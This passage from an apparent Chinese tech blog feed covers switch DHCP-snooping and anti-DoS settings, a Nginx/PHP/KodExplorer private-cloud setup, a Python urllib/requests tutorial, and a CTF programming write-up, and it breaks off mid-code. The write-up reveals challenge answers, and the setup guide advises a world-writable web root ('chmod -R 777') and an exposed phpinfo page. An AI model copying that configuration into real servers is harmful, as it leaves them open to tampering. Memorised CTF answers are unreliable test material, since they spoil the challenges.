class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ip dhcp snooping <span class="built_in">enable</span> <span class="comment">#开启dhcp侦听</span></span><br><span class="line">ip dhcp snooping binding <span class="built_in">enable</span> <span class="comment">#开启dhcp侦听绑定功能</span></span><br><span class="line">ip dhcp snooping binding arp <span class="comment">#绑定arp</span></span><br><span class="line">ip dhcp snooping binding dot1x <span class="comment">#绑定dot1x</span></span><br><span class="line">ip dhcp snooping <span class="built_in">limit</span>-rate &lt;pps&gt; <span class="comment">#配置 DHCP snooping 报文转发速率</span></span><br><span class="line"></span><br><span class="line">interface ethernet 1/0/11 <span class="comment">#进入接口</span></span><br><span class="line">ip dhcp snooping trust <span class="comment">#配置接口为信任项</span></span><br><span class="line">interface ethernet 1/0/1-10 <span class="comment">#多个接口配置</span></span><br><span class="line">ip dhcp snooping action shutdown <span class="comment">#配置接口为非信任项</span></span><br></pre></td></tr></table></figure><p><br></p><h1 id="抗Ddos攻击"><a href="#抗Ddos攻击" class="headerlink" title="抗Ddos攻击"></a>抗Ddos攻击</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dosattack-check srcip-equal-dstip <span class="built_in">enable</span> <span class="comment">#防IP Spoofing攻击</span></span><br><span class="line">dosattack-check ipv4-first-fragment <span class="built_in">enable</span> <span class="comment">#启用对第一片段IPv4包的检查</span></span><br><span class="line">dosattack-check tcp-flags <span class="built_in">enable</span> <span class="comment">#防TCP非法标志攻击</span></span><br><span class="line">dosattack-check srcport-equal-dstport <span class="built_in">enable</span> <span class="comment">#启用TCP/UDP L4端口的检查，防止端口欺骗</span></span><br><span class="line">dosattack-check tcp-fragment <span class="built_in">enable</span> <span class="comment">#防TCP碎片攻击</span></span><br><span class="line">dosattack-check icmp-attacking <span class="built_in">enable</span> <span class="comment">#防icmp碎片攻击</span></span><br><span class="line">dosattack-check icmpV4-size 64 <span class="comment">#icmp包大小限制64</span></span><br><span class="line">dosattack-check tcp-segment 20 <span class="comment">#TCP段大小限制</span></span><br></pre></td></tr></table></figure><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由交换技术 </tag>
            
            <tag> Switch </tag>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>私有云搭建</title>
      <link href="/2018/04/18/%E7%A7%81%E6%9C%89%E4%BA%91%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/04/18/%E7%A7%81%E6%9C%89%E4%BA%91%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Ubuntu+Nginx+PHP7+KodExplorer</p></blockquote><a id="more"></a><h1 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure><p>测试服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure></p><p>访问本地地址：http: //localhost/<br><br></p><h1 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php</span><br></pre></td></tr></table></figure><p>配置Nginx<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80 default_server;</span><br><span class="line">listen [::]:80 default_server;</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSL configuration</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># listen 443 ssl default_server;</span></span><br><span class="line"><span class="comment"># listen [::]:443 ssl default_server;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note: You should disable gzip for SSL traffic.</span></span><br><span class="line"><span class="comment"># See: https://bugs.debian.org/773332</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Read up on ssl_ciphers to ensure a secure configuration.</span></span><br><span class="line"><span class="comment"># See: https://bugs.debian.org/765782</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Self signed certs generated by the ssl-cert package</span></span><br><span class="line"><span class="comment"># Don't use them in a production server!</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># include snippets/snakeoil.conf;</span></span><br><span class="line"></span><br><span class="line">root /var/www/html;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add index.php to the list if you are using PHP</span></span><br><span class="line">index index.php index.html index.htm index.nginx-debian.html; <span class="comment">#添加一个index.php</span></span><br><span class="line"></span><br><span class="line">server_name 192.168.100.100; <span class="comment">#添加站点地址</span></span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line"><span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line"><span class="comment"># as directory, then fall back to displaying a 404.</span></span><br><span class="line">try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">include snippets/fastcgi-php.conf;</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## With php7.0-cgi alone:</span></span><br><span class="line"><span class="comment">#fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line"><span class="comment">## With php7.0-fpm:</span></span><br><span class="line">fastcgi_pass unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># deny access to .htaccess files, if Apache's document root</span></span><br><span class="line"><span class="comment"># concurs with nginx's one</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">location ~ /\.ht &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>测试，在/var/www/html目录下创建文件info.php<br>添加以下内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>访问http: //192.168.100.100/info.php是否能够看到php信息<br><br></p><h1 id="KodExplorer下载及使用"><a href="#KodExplorer下载及使用" class="headerlink" title="KodExplorer下载及使用"></a>KodExplorer下载及使用</h1><p>下载地址：<a href="https://kodcloud.com/download/" target="_blank" rel="noopener">可道云</a><br>解压后放到linux上，我这里是放在默认目录下：/var/www/html/<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">zxw@ubuntu:/var/www/html$ ls -l</span><br><span class="line">总用量 112</span><br><span class="line">drwxr-xr-x 10 root root  4096 4月  18 17:25 app</span><br><span class="line">-rw-r--r--  1 root root 76552 4月  18 17:25 ChangeLog.md</span><br><span class="line">drwxr-xr-x  3 root root  4096 4月  18 17:25 config</span><br><span class="line">drwxr-xr-x  7 root root  4096 4月  18 17:25 data</span><br><span class="line">-rw-r--r--  1 root root   612 4月  18 17:15 index.nginx-debian.html</span><br><span class="line">-rw-r--r--  1 root root   118 4月  18 17:25 index.php</span><br><span class="line">drwxr-xr-x 13 root root  4096 4月  18 17:25 plugins</span><br><span class="line">-rw-r--r--  1 root root  7753 4月  18 17:25 README.MD</span><br><span class="line">drwxr-xr-x  6 root root  4096 4月  18 17:25 static</span><br></pre></td></tr></table></figure></p><p>修改权限777<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod -R 777 /var/www/html/</span><br></pre></td></tr></table></figure></p><p>安装运行需要的php库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php-curl</span><br><span class="line">sudo apt-get install php-mbstring</span><br><span class="line">sudo apt-get install php-gd</span><br></pre></td></tr></table></figure></p><p>安装KodExplorer<br>访问<a href="http://192.168.100.100/" target="_blank" rel="noopener">http://192.168.100.100/</a><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/KodExplorer/1.png" alt="" title="" class="">                <p></p>            </figure><br>设置admin密码后登陆，请尽情的使用吧<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/KodExplorer/2.png" alt="" title="" class="">                <p></p>            </figure><br><br></p><h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>与wordpress搭配一起使用时，可道云在站点的二级目录下<br>data目录迁移后如可能会发生写入session会话错误<br>迁移方式查看站点目录下的config目录中的config.php里的注释说明<br>则将config.php中的session路径写死在站点目录下,不再将data目录中的session迁移出去<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/KodExplorer/3.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'KOD_SESSION'</span>,   <span class="string">'data/session/'</span>);     <span class="comment">//session目录</span></span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/KodExplorer/4.png" alt="" title="" class="">                <p></p>            </figure><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> PHP </tag>
            
            <tag> 私有云 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python-http</title>
      <link href="/2018/04/15/Python-http/"/>
      <url>/2018/04/15/Python-http/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Python爬虫使用urllib and requests</p></blockquote><a id="more"></a><h1 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h1><p>参考资料：<br><a href="http://www.cnblogs.com/zhaof/p/6910871.html" target="_blank" rel="noopener">python爬虫从入门到放弃（三）之 Urllib库的基本使用</a><br><a href="https://cuiqingcai.com/947.html" target="_blank" rel="noopener">Python爬虫入门三之Urllib库的基本使用</a><br><a href="http://www.jb51.net/article/92818.htm" target="_blank" rel="noopener">Python3的urllib.parse常用函数小结</a><br><a href="https://www.jianshu.com/p/9e50c58dabdd" target="_blank" rel="noopener">python3 get和post请求</a></p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><blockquote><p>urllib.request 请求模块<br>urllib.error 异常处理模块<br>urllib.parse url解析模块<br>urllib.robotparser robots.txt解析模块</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request <span class="comment"># 导入模块</span></span><br></pre></td></tr></table></figure><h2 id="request-Request"><a href="#request-Request" class="headerlink" title="request.Request"></a>request.Request</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">req = request.Request(<span class="string">"url"</span>) <span class="comment"># 创建一个url对象</span></span><br><span class="line">req.add_header(<span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=ga0un6plm7tea9li11bgnommh1"</span>) <span class="comment"># 添加头部信息,例如cookie,多个信息时用分号隔开</span></span><br></pre></td></tr></table></figure><p>两种添加头部信息的方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'httpbin.org'</span></span><br><span class="line">&#125;</span><br><span class="line">dict = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'zhaofan'</span></span><br><span class="line">&#125;</span><br><span class="line">data = bytes(parse.urlencode(dict), encoding=<span class="string">'utf8'</span>)</span><br><span class="line">req = request.Request(url=url, data=data, headers=headers, method=<span class="string">'POST'</span>)</span><br><span class="line">response = request.urlopen(req)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line">dict = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'Germey'</span></span><br><span class="line">&#125;</span><br><span class="line">data = bytes(parse.urlencode(dict), encoding=<span class="string">'utf8'</span>)</span><br><span class="line">req = request.Request(url=url, data=data, method=<span class="string">'POST'</span>)</span><br><span class="line">req.add_header(<span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=ga0un6plm7tea9li11bgnommh1"</span>)</span><br><span class="line">response = request.urlopen(req)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><h2 id="request-urlopen"><a href="#request-urlopen" class="headerlink" title="request.urlopen"></a>request.urlopen</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlopen(url, data, timeout)</span><br><span class="line"><span class="comment"># 第一个参数url即为URL，第二个参数data是访问URL时要传送的数据，第三个timeout是设置超时时间。</span></span><br><span class="line"><span class="comment"># 第二三个参数是可以不传送的，data默认为空None，timeout默认为 socket._GLOBAL_DEFAULT_TIMEOUT。</span></span><br><span class="line"><span class="comment"># 第一个参数URL是必须要传送的，在这个例子里面我们传送了百度的URL，执行urlopen方法之后，返回一个response对象，返回信息便保存在这里面。</span></span><br></pre></td></tr></table></figure><h3 id="打开一个百度链接"><a href="#打开一个百度链接" class="headerlink" title="打开一个百度链接"></a>打开一个百度链接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">response = request.urlopen(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>)) <span class="comment"># 查看返回信息必须带上read(),否则返回对象描述，decode()解码大多数为‘utf-8’或‘gbk’</span></span><br><span class="line">print(response.getheaders()) <span class="comment"># 查看响应头</span></span><br></pre></td></tr></table></figure><p>可以用for循环修改打印的格式<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a,b <span class="keyword">in</span> response.getheaders():</span><br><span class="line">    print(<span class="string">'%s: %s'</span> % (a, b))</span><br></pre></td></tr></table></figure></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Date</span>: Mon, 16 Apr 2018 02:31:13 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Connection</span>: Close</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Set-Cookie</span>: BAIDUID=05730C3C016AA6027A951688792E8891:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com</span><br><span class="line"><span class="attribute">Set-Cookie</span>: BIDUPSID=05730C3C016AA6027A951688792E8891; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com</span><br><span class="line"><span class="attribute">Set-Cookie</span>: PSTM=1523845873; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com</span><br><span class="line"><span class="attribute">Set-Cookie</span>: BDSVRTM=0; path=/</span><br><span class="line"><span class="attribute">Set-Cookie</span>: BD_HOME=0; path=/</span><br><span class="line"><span class="attribute">Set-Cookie</span>: H_PS_PSSID=1456_21112_20929; path=/; domain=.baidu.com</span><br><span class="line"><span class="attribute">P3P</span>: CP=" OTI DSP COR IVA OUR IND COM "</span><br><span class="line"><span class="attribute">Cache-Control</span>: private</span><br><span class="line"><span class="attribute">Cxy_all</span>: baidu+6d6c985d736e75076f923a5ec17088e3</span><br><span class="line"><span class="attribute">Expires</span>: Mon, 16 Apr 2018 02:30:23 GMT</span><br><span class="line"><span class="attribute">X-Powered-By</span>: HPHP</span><br><span class="line"><span class="attribute">Server</span>: BWS/1.1</span><br><span class="line"><span class="attribute">X-UA-Compatible</span>: IE=Edge,chrome=1</span><br><span class="line"><span class="attribute">BDPAGETYPE</span>: 1</span><br><span class="line"><span class="attribute">BDQID</span>: 0xee6d60d000001ac3</span><br><span class="line"><span class="attribute">BDUSERID</span>: 0</span><br></pre></td></tr></table></figure><p><br></p><h2 id="urllib-parse-url解析薄块"><a href="#urllib-parse-url解析薄块" class="headerlink" title="urllib.parse url解析薄块"></a>urllib.parse url解析薄块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse <span class="comment"># 导入模块</span></span><br></pre></td></tr></table></figure><p>不知道怎么讲，直接上一道CTFweb题目吧，这是实验吧的一道web题，<br>原题链接：<a href="http://www.shiyanbar.com/ctf/1854" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1854</a><br>解题链接：<a href="http://ctf5.shiyanbar.com/web/10/10.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/10/10.php</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">    req = request.Request(url)</span><br><span class="line">    req.add_header(<span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=ga0un6plm7tea9li11bgnommh1"</span>) <span class="comment"># 添加cookie</span></span><br><span class="line">    response = request.urlopen(req) <span class="comment"># 打开链接</span></span><br><span class="line">    head = response.getheaders()[<span class="number">3</span>][<span class="number">1</span>] <span class="comment"># 获取头部信息</span></span><br><span class="line">    post = base64.b64decode(head).decode(<span class="string">'utf-8'</span>)[<span class="number">25</span>:] <span class="comment"># base64解密</span></span><br><span class="line">    data = parse.urlencode([(<span class="string">'key'</span>,post)])  <span class="comment"># 将值加入post数据中</span></span><br><span class="line">    response = request.urlopen(req,data.encode(<span class="string">'utf-8'</span>)) <span class="comment"># 打开链接并添加utf-8编码后的数据</span></span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>)) <span class="comment"># 读取结果并utf-8解码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><h2 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line">data=&#123;&#125;</span><br><span class="line">data[<span class="string">'name'</span>]=<span class="string">'aaa'</span></span><br><span class="line">url_parame=parse.urlencode(data)</span><br><span class="line">url=<span class="string">"http://xxxx"</span></span><br><span class="line">all_url=url+url_parame</span><br><span class="line">response=request.urlopen(all_url).read()</span><br><span class="line">print(response.read())</span><br></pre></td></tr></table></figure><h2 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://xxxxxx'</span></span><br><span class="line">user_agent = <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span></span><br><span class="line">values = &#123;<span class="string">'name'</span> : <span class="string">'aaa'</span>&#125;</span><br><span class="line">headers = &#123; <span class="string">'User-Agent'</span> : user_agent &#125;</span><br><span class="line">data = parse.urlencode(values)</span><br><span class="line">req = request.Request(url+<span class="string">'?'</span>+data)</span><br><span class="line">response = request.urlopen(req)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p><br><br><br></p><h1 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h1><p>参考资料：<br><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a><br><a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html" target="_blank" rel="noopener">http://docs.python-requests.org/zh_CN/latest/user/advanced.html</a></p><h2 id="安装requests"><a href="#安装requests" class="headerlink" title="安装requests"></a>安装requests</h2><blockquote><p>pip install requests<br>pip list # 查看</p></blockquote><h2 id="get请求-1"><a href="#get请求-1" class="headerlink" title="get请求"></a>get请求</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">"http://xxxxx?name=aaa"</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="post请求-1"><a href="#post请求-1" class="headerlink" title="post请求"></a>post请求</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">postdata = &#123; <span class="string">'name'</span>:<span class="string">'aaa'</span> &#125;</span><br><span class="line">r = requests.post(<span class="string">"http://xxxxx?name=aaa"</span>,data=postdata)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧-PPC-writeup</title>
      <link href="/2018/04/11/%E5%AE%9E%E9%AA%8C%E5%90%A7-PPC-writeup/"/>
      <url>/2018/04/11/%E5%AE%9E%E9%AA%8C%E5%90%A7-PPC-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>实验吧编程类题目</p></blockquote><a id="more"></a><h1 id="小猴子爱吃桃子"><a href="#小猴子爱吃桃子" class="headerlink" title="小猴子爱吃桃子"></a>小猴子爱吃桃子</h1><p>猴子吃桃问题：猴子第一天摘下若干个桃子，当即吃了一半，还不瘾，又多吃了一个 第二天早上又将剩下的桃子吃掉一半，又多吃了一个。以后每天早上都吃了前一天剩下的一半零一个。到第10天早上想再吃时，见只剩下一个桃子了。求第一天共摘了多少。<br>格式：CTF{}<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    num = (num+<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">print(num)</span><br></pre></td></tr></table></figure></p><!--CTF{1534}--><h1 id="找素数"><a href="#找素数" class="headerlink" title="找素数"></a>找素数</h1><p>设一个等差数列，首元素为367，公差为186, 现在要求找出属于该等差数列中的第151个素数并输出。<br>格式：CTF{xxx}<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sushu = <span class="number">0</span></span><br><span class="line">num = <span class="number">367</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> sushu &lt; <span class="number">151</span>:</span><br><span class="line">        yushu = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,num<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> num%i == <span class="number">0</span>:</span><br><span class="line">                yushu = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> yushu == <span class="number">0</span>:</span><br><span class="line">            sushu = sushu + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> sushu == <span class="number">151</span>:</span><br><span class="line">        print(num)</span><br><span class="line">        